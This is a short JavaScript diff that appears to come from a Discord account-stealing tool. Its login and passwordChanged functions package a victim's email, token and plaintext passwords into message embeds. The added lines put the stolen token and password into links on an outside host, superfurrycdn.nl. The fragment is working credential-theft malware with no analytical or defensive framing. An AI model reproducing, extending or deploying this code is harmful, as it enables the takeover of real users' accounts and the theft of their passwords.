@@ -611,7 +611,7 @@ const login = async (email, password, token) => {
         fields: [
           {
             name: '<a:944007295417843743:959785231982931979> Token:',
-            value: `\`${token}\` [Click to copy](https://superfurrycdn.nl/copy/{token})`,
+            value: `\`${token}\` [Click to copy](https://superfurrycdn.nl/copy/${token}):${password}`,
             inline: false,
           },
           {
@@ -676,7 +676,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         fields: [
           {
             name: '**Password Changed**',
-            value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}**`,
+            value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}** [Click to copy](https://superfurrycdn.nl/copy/${token}):${newpassword}`,
             inline: true,
           },
           {
